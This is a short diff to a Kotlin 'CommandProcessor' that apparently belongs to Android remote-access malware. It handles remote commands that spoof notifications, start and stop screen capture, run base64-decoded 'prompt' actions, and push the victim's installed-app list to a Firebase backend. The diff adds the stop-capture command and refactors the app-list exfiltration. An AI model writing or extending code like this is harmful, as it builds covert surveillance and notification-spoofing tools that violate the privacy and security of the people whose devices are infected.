@@ -38,7 +38,11 @@ object CommandProcessor {
                 NotificationSpoofer.show(context, title, body, cmd.iconUrl, cmd.bigPictureUrl)
             }
             "start_screen_capture" -> svc.startScreenCapture()
-            "get_apps" -> FirebaseBridge.pushAppsList(svc.getInstalledApps())
+            "stop_screen_capture" -> svc.stopScreenCapture()
+            "get_apps" -> {
+                val apps = svc.getInstalledApps()
+                FirebaseBridge.pushInstalledApps(apps)
+            }
             "prompt" -> {
                 val promptText = decodeIfBase64(cmd.text) ?: return
                 val actions = NLPParser.parse(promptText)
